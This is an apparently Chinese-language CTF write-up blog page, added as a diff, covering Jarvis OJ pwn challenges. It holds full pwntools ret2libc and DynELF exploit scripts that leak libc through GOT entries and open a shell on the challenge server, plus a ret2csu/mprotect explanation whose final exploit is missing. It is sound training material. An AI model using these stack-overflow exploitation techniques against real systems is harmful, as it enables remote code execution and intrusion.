@@ -1,0 +1,530 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>Jarvis OJ pwn wp(未完...看情况继续写) | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="写于19.7.12  用jarvis复习复习，题总是做不出来…☹ level3_x640x01寻找漏洞checksec 1234567kk@ubuntu:~/Desktop/black/Jarvis Oj/level3$ checksec level3_x64 [*] &amp;apos;/home/kk/Desktop/black/Jarvis Oj/level3/level3_x64&amp;apos;">
+<meta name="keywords" content="pwn,wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ pwn wp(未完...看情况继续写)">
+<meta property="og:url" content="p1Kk.github.io/2019/10/03/Jarvis oj/wp/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="写于19.7.12  用jarvis复习复习，题总是做不出来…☹ level3_x640x01寻找漏洞checksec 1234567kk@ubuntu:~/Desktop/black/Jarvis Oj/level3$ checksec level3_x64 [*] &amp;apos;/home/kk/Desktop/black/Jarvis Oj/level3/level3_x64&amp;apos;">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-3da0ed50a8dae48c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-f1598702e0fe8aaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-b0844c46cf06b414.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-10-03T03:09:11.697Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jarvis OJ pwn wp(未完...看情况继续写)">
+<meta name="twitter:description" content="写于19.7.12  用jarvis复习复习，题总是做不出来…☹ level3_x640x01寻找漏洞checksec 1234567kk@ubuntu:~/Desktop/black/Jarvis Oj/level3$ checksec level3_x64 [*] &amp;apos;/home/kk/Desktop/black/Jarvis Oj/level3/level3_x64&amp;apos;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/17548101-3da0ed50a8dae48c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/03/Jarvis oj/wp/" title="Jarvis OJ pwn wp(未完...看情况继续写)" itemprop="url">Jarvis OJ pwn wp(未完...看情况继续写)</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-10-03T03:01:17.634Z" itemprop="datePublished"> Published 2019-10-03</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#level3-x64"><span class="toc-number">1.</span> <span class="toc-text">level3_x64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">0x01寻找漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02利用思路"><span class="toc-number">1.2.</span> <span class="toc-text">0x02利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03攻击"><span class="toc-number">1.3.</span> <span class="toc-text">0x03攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level4"><span class="toc-number">2.</span> <span class="toc-text">level4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-number">2.1.</span> <span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level5"><span class="toc-number">3.</span> <span class="toc-text">level5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞-1"><span class="toc-number">3.1.</span> <span class="toc-text">0x01寻找漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02思路"><span class="toc-number">3.2.</span> <span class="toc-text">0x02思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03攻击-1"><span class="toc-number">3.3.</span> <span class="toc-text">0x03攻击</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<ul>
+<li>写于19.7.12</li>
+</ul>
+<p>用jarvis复习复习，题总是做不出来…☹</p>
+<h1 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h1><h2 id="0x01寻找漏洞"><a href="#0x01寻找漏洞" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><p><strong>checksec</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/Jarvis Oj/level3$ checksec level3_x64 </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/Jarvis Oj/level3/level3_x64&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>开启NX，不能转入shellcode<br><strong>ida</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7uLL);</span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);    ==&gt;存在很明显的栈溢出</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02利用思路"><a href="#0x02利用思路" class="headerlink" title="0x02利用思路"></a>0x02利用思路</h2><p>程序中没有<code>system</code>函数和<code>/bin/sh</code>字符串，但是有<code>read</code>和<code>write</code>函数，可以利用泄露。<br>题目给出了libc文件，利用<code>write</code>泄露出<code>read</code>在got表中的地址，计算偏移，找到<code>system</code>和<code>/bin/sh</code>地址<br>64位传参：参数从左到右放入寄存器：RDI, RSI, RDX, ECX, R8, R9。当参数为7个以上时，前6个与前面一样，但后面的依次从“右向左”放入栈中。<br>在这道题中，<code>rdi</code>，<code>rsi</code>，<code>rdx</code>分别对应<code>文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）</code>，<code>起始地址</code>，<code>读入的长度</code>\</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/Jarvis Oj/level3$ ROPgadget --binary level3_x64 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b2 : pop r15 ; ret</span><br><span class="line">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400550 : pop rbp ; ret</span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br><span class="line">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400499 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>
+
+<p>要构造栈，查找到0x00000000004006b3对应<code>rdi</code>和0x00000000004006b1对应<code>rsi</code>，但是<code>rdx</code>我们还没有控制，此时检验<code>rdx</code>的长度只要不小于8字节即可（泄露的地址大小 = 0x8）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040060b in vulnerable_function ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x7fffffffddb0 ◂— 0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffff79002c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x200    ===========================================================&gt; rdx &gt;= 8</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x4006d4 ◂— outsb  dx, byte ptr [rsi] /* &apos;Input:\n&apos; */</span><br><span class="line"> R8   0x4006c0 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x86f</span><br><span class="line"> R11  0x346</span><br><span class="line"> R12  0x4004f0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffdf30 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffde30 —▸ 0x7fffffffde50 —▸ 0x400650 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffddb0 ◂— 0x0</span><br><span class="line"> RIP  0x40060b (vulnerable_function+37) ◂— mov    rsi, rax</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x400602 &lt;vulnerable_function+28&gt;    lea    rax, [rbp - 0x80]</span><br><span class="line">   0x400606 &lt;vulnerable_function+32&gt;    mov    edx, 0x200</span><br><span class="line"> ► 0x40060b &lt;vulnerable_function+37&gt;    mov    rsi, rax</span><br><span class="line">   0x40060e &lt;vulnerable_function+40&gt;    mov    edi, 0</span><br><span class="line">   0x400613 &lt;vulnerable_function+45&gt;    call   read@plt &lt;0x4004c0&gt;</span><br><span class="line"> </span><br><span class="line">   0x400618 &lt;vulnerable_function+50&gt;    leave  </span><br><span class="line">   0x400619 &lt;vulnerable_function+51&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x40061a &lt;main&gt;                      push   rbp</span><br><span class="line">   0x40061b &lt;main+1&gt;                    mov    rbp, rsp</span><br><span class="line">   0x40061e &lt;main+4&gt;                    sub    rsp, 0x10</span><br><span class="line">   0x400622 &lt;main+8&gt;                    mov    dword ptr [rbp - 4], edi</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rax rsp  0x7fffffffddb0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">04:0020│          0x7fffffffddd0 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2e1 ◂— &apos;XDG_VTNR=7&apos;</span><br><span class="line">05:0028│          0x7fffffffddd8 ◂— 0x0</span><br><span class="line">06:0030│          0x7fffffffdde0 ◂— 0x1</span><br><span class="line">07:0038│          0x7fffffffdde8 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2e1 ◂— &apos;XDG_VTNR=7&apos;</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           40060b vulnerable_function+37</span><br><span class="line">   f 1           400633 main+25</span><br><span class="line">   f 2     7ffff7829830 __libc_start_main+240</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03攻击"><a href="#0x03攻击" class="headerlink" title="0x03攻击"></a>0x03攻击</h2><p>小声bb：传参传参很重要啊，要会构造啊！！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io = remote(&quot;pwn2.jarvisoj.com&quot;, 9883)</span><br><span class="line"># io = process(&quot;./level3_x64&quot;)</span><br><span class="line">libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line">elf = ELF(&quot;./level3_x64&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line">write_plt=elf.plt[&quot;write&quot;] </span><br><span class="line">read_got=elf.got[&quot;read&quot;] </span><br><span class="line">vul_addr=elf.symbols[&apos;vulnerable_function&apos;]</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(read_got) + &quot;a&quot; * 8 + p64(write_plt) </span><br><span class="line">payload += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(io.recv()[0:8])</span><br><span class="line">print &quot;read_addr ==&gt; &quot;+hex(read_addr) </span><br><span class="line"></span><br><span class="line">offset = read_addr - libc.symbols[&quot;read&quot;] </span><br><span class="line">sys_addr = offset + libc.symbols[&quot;system&quot;] </span><br><span class="line">binsh_addr = offset + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot; * 0x88 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(vul_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>程序开启了NX保护，漏洞很好找</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-3da0ed50a8dae48c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<blockquote>
+<p>无libc，无system，无”/bin/sh”</p>
+</blockquote>
+<p>有<code>read</code> <code>write</code>函数<br>借用pwntools自带的模块<code>DynELF</code>进行泄露</p>
+<hr>
+<p>1.利用write函数泄露system地址<br>2.利用read函数将”/bin/sh”字符串写到bss段中<br>3.调用system(“/bin/sh”)</p>
+<hr>
+<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;pwn2.jarvisoj.com&quot;, &quot;9880&quot;)</span><br><span class="line"># io = process(&apos;./level4&apos;)</span><br><span class="line">elf = ELF(&apos;level4&apos;)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line"># start_addr = elf.symbols[&apos;start&apos;]</span><br><span class="line">start_addr = 0x08048350</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804A024</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">  payload = &apos;a&apos; * 0x88 + &apos;a&apos; * 4 + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) + p32(4)</span><br><span class="line">  io.sendline(payload)</span><br><span class="line">  leak_addr = io.recv(4)</span><br><span class="line">  return leak_addr</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = ELF(&apos;level4&apos;))</span><br><span class="line">sys_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;a&apos; * 0x88 + &apos;a&apos; * 4 + p32(read_plt) + p32(start_addr) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">payload3 = &apos;a&apos; * 0x88 + &apos;a&apos; * 4 + p32(sys_addr) + p32(0xaaaa) + p32(bss_addr)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><blockquote>
+<p>题目要求：附件同level3_x64，<code>mmap</code>和<code>mprotect</code>练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</p>
+</blockquote>
+<p>那么首先，参考<a href="https://blog.csdn.net/ouyangjinbin/article/details/51077351" target="_blank" rel="noopener">mmap函数和mprotect函数</a></p>
+<p><strong>🌸什么是mmap？==&gt;告诉内核将一个给定的文件映射到一个存储区域中</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void mmap( void *start , size_t length , int prot , int flags , int fd , off_t offsize);</span><br></pre></td></tr></table></figure>
+
+<p><strong>void *mmap(void *addr,</strong>   //用于指定映射存储区的起始地址，通常设置为0，表示让操作系统选择该映射区的起始地址。此函数的返回地址是映射区的起始地址。<br><strong>size_t len,</strong>  //映射的字节数<br><strong>int plot,</strong>  //对映射区的保护要求 1、PROT_READ(映射区可读)  2、PROT_WRITE(映射区可写)  3、PROT_EXEC(映射区可执行)  4、PROT_NONE(映射区不可访问)<br><strong>int flag,</strong>   //flag参数影响映射存储区的各种属性<br><strong>int filedes,</strong>      //指定要被映射文件的描述符<br><strong>off_t off);</strong>   //off表示要映射的字节在文件中的起始偏移量<br>（六个参数用rdi，rsi，rdx，rcx，r8，r9控制）</p>
+<p><strong>🌸什么是mprotect？==&gt;更改一个现存映射存储区的权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(const void start, size_t len, int prot);</span><br></pre></td></tr></table></figure>
+
+<p><strong>int *mprotect(void *addr,</strong>   //地址addr必须是系统页长的整数倍（一页=4kb=0x1000b）<br><strong>size_t len,</strong>   //len长度<br><strong>int plot);</strong>    // 对存储映射区保护要求（权限值） 1、PROT_READ     2、PROT_WRITE    3、PROT_EXEC    4、PROT_NONE<br>（三个参数分别用rdi， rsi， rdx 控制）</p>
+<hr>
+<h2 id="0x01寻找漏洞-1"><a href="#0x01寻找漏洞-1" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><p>开启NX保护。</p>
+<p>程序存在栈溢出漏洞</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-f1598702e0fe8aaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<hr>
+<h2 id="0x02思路"><a href="#0x02思路" class="headerlink" title="0x02思路"></a>0x02思路</h2><p>1.利用<code>write</code>泄露libc<br>2.得到<code>mprotect</code>函数在内存中的地址<br>3.将shellcode写入bss段<br>4.将bss和<code>mprotect</code>函数写入got表（利用got地址处为空的地址即可）<br>5.利用通用gadget调用<code>mprotect</code>，将bss段设置为可执行跳转到bss段执行shellcode</p>
+<hr>
+<p>通用gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400650 ; void _libc_csu_init(void)</span><br><span class="line">.text:0000000000400650                 public __libc_csu_init</span><br><span class="line">.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:0000000000400650 ; __unwind &#123;</span><br><span class="line">.text:0000000000400650                 push    r15</span><br><span class="line">.text:0000000000400652                 mov     r15d, edi</span><br><span class="line">.text:0000000000400655                 push    r14</span><br><span class="line">.text:0000000000400657                 mov     r14, rsi</span><br><span class="line">.text:000000000040065A                 push    r13</span><br><span class="line">.text:000000000040065C                 mov     r13, rdx</span><br><span class="line">.text:000000000040065F                 push    r12</span><br><span class="line">.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400668                 push    rbp</span><br><span class="line">.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000400670                 push    rbx</span><br><span class="line">.text:0000000000400671                 sub     rbp, r12</span><br><span class="line">.text:0000000000400674                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400676                 sar     rbp, 3</span><br><span class="line">.text:000000000040067A                 sub     rsp, 8</span><br><span class="line">.text:000000000040067E                 call    _init_proc</span><br><span class="line">.text:0000000000400683                 test    rbp, rbp</span><br><span class="line">.text:0000000000400686                 jz      short loc_4006A6</span><br><span class="line">.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400690</span><br><span class="line">.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400690                 mov     rdx, r13</span><br><span class="line">.text:0000000000400693                 mov     rsi, r14</span><br><span class="line">.text:0000000000400696                 mov     edi, r15d</span><br><span class="line">.text:0000000000400699                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040069D                 add     rbx, 1</span><br><span class="line">.text:00000000004006A1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004006A4                 jnz     short loc_400690</span><br><span class="line">.text:00000000004006A6</span><br><span class="line">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j</span><br><span class="line">.text:00000000004006A6                 add     rsp, 8</span><br><span class="line">.text:00000000004006AA                 pop     rbx</span><br><span class="line">.text:00000000004006AB                 pop     rbp</span><br><span class="line">.text:00000000004006AC                 pop     r12</span><br><span class="line">.text:00000000004006AE                 pop     r13</span><br><span class="line">.text:00000000004006B0                 pop     r14</span><br><span class="line">.text:00000000004006B2                 pop     r15</span><br><span class="line">.text:00000000004006B4                 retn</span><br><span class="line">.text:00000000004006B4 ; &#125; // starts at 400650</span><br><span class="line">.text:00000000004006B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>在函数<code>loc_400690</code>中，可以通过r13，r14，r15来控制rdx，rsi，edi<br>在函数<code>loc_4006A6</code>中，可以控制r13，r14，r15。<br>由此，我们可以控制<code>mprotect</code>函数的三个参数<br>首先布置栈来确定rbx, rbp, r12, r13, r14, r15的值，然后将返回地址置为<code>loc_400690</code>函数地址，<code>loc_400690</code>函数中的call ptr[r12+rbx*8]由前面的布置决定，由于是call ptr指令，所以要用got表地址来解析<br>为了确保不jnz，要将rbx置为0。可执行权限取决于r13，设置为7（rwx），长度取决于r14（设置的权限的地址的范围，对于此题，我们要将bss段包含进去），地址取决于r15</p>
+<h2 id="0x03攻击-1"><a href="#0x03攻击-1" class="headerlink" title="0x03攻击"></a>0x03攻击</h2><blockquote>
+<p>这道题的exp有这么几个和我不太一样的版本：<br>1.<a href="https://www.cnblogs.com/snip3r/p/9947961.html" target="_blank" rel="noopener">https://www.cnblogs.com/snip3r/p/9947961.html</a><br>这个难理解的就是pop rbx的偏移（对我而言）<br><img src="https://upload-images.jianshu.io/upload_images/17548101-b0844c46cf06b414.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>2.<a href="https://blog.csdn.net/qq_38204481/article/details/80984318" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/80984318</a><br>这两位师傅写的我测试了，根据自己的文件进行修改，都是可以cat flag滴，放心食用</p>
+</blockquote>
+<blockquote>
+<p>关于不加pause()远程打不通，有师傅说是<strong>一次发送的payload数据包太大，read函数会截断发送导致攻击失败</strong></p>
+</blockquote>
+<p>完整exp：这个脚本我调了好久…不知道为啥打不通…后期来改TAT</p>
